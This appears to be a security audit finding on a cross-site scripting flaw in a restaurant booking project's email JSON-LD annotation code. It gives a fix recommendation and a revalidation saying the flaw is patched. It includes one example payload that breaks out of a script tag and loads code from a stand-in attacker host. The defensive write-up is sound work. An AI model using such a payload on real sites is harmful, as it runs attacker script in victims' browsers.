# [HIGH] JSON-LD annotation can break out into executable script

**File:** [`server/emails/base.ts`](https://github.com/lapeninns/nabatable/blob/codex/Menu/blob/codex/server/emails/base.ts#L82-L202) (lines 82, 83, 87, 89, 90, 94, 202)
**Project:** nabatableLP
**Severity:** HIGH • **Confidence:** high • **Slug:** `xss`

## Owners

**Suggested assignee:** `159779640+amanshresthaa@users.noreply.github.com` _(via last-committer)_

## Finding

renderAnnotationScript serializes annotation data with raw JSON.stringify directly inside a <script type="application/ld+json"> tag. If any serialized field contains </script><script>...</script>, the browser closes the JSON-LD script and executes the injected script. This is exploitable through booking email previews: server/emails/bookings.ts passes template-controlled ctaLabel/actionUrl and restaurant-controlled venue name/address into this annotation, the preview route accepts draft variants, and the ops UI renders preview.html via an unsandboxed srcDoc iframe. A payload such as a CTA label of </script><script src=//attacker.example/x></script> is within the 60 character schema limit and would execute as same-origin script in the preview.

## Recommendation

Replace JSON.stringify in script contexts with a safe serializer that escapes at least '<' as '\u003c' or '<\/' and also handles '&', '>', U+2028, and U+2029. Also sandbox the preview iframe without allow-same-origin/allow-scripts unless scripts are explicitly required.

## Revalidation

**Verdict:** fixed

The current renderAnnotationScript no longer embeds raw JSON.stringify output in the script block. It imports safeJsonForHtmlScript and returns the JSON-LD as safeJsonForHtmlScript(schema), which escapes <, >, &, U+2028, and U+2029, so a value like </script><script> cannot terminate the JSON-LD script element. The actionUrl is also normalized through safePublicHref before being placed into the schema target. I traced the booking preview flow through renderRestaurantBookingEmailPreview and renderHtml; venue name/address and CTA label still reach the annotation, but the script-context serializer now neutralizes them. The shipped email-template UI at src/app/app/(app)/email-templates/page.tsx uses EmailTemplatesPreviewPane, whose iframe passes sandbox="", so scripts are disabled in the real preview surface as well. There is an older EmailTemplatesSection component with an unsandboxed srcDoc iframe, but grep found no shipped route importing it, and the restaurant settings route redirects to /app/email-templates. Git history shows commit 020a7389 changed server/emails/base.ts from JSON.stringify(schema) to safeJsonForHtmlScript(schema), which is the relevant patch.

## Recent committers (`git log`)

- amanshresthaa <159779640+amanshresthaa@users.noreply.github.com> (2026-05-05)
- amanshresthaa <aman.shrestha@mail.bcu.ac.uk> (2025-12-26)
